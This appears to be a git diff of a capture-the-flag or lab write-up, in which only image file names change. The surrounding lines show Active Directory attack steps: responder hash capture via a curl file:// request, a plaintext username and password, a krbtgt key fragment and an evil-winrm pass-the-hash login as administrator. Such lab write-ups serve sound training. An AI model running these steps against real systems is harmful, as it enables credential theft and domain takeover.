@@ -249,7 +249,7 @@ responder -I tun0
 curl file://10.23.52.142/file.txt
 ```
 
-<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -273,7 +273,7 @@ o.armstrong : arMStronG08
 
 Looking the bloodhound results we can view this:
 
-<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -344,7 +344,7 @@ krbtgt:aes256-cts-hmac-sha1-96:10e96d99d70a03db0d17a30bda313478b4873d29e3e767474
 evil-winrm -i 10.10.88.111 -u 'administrator' -H '15ecc755a43d2e7c8001215609d94b90'
 ```
 
-<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Print the root flag.
 
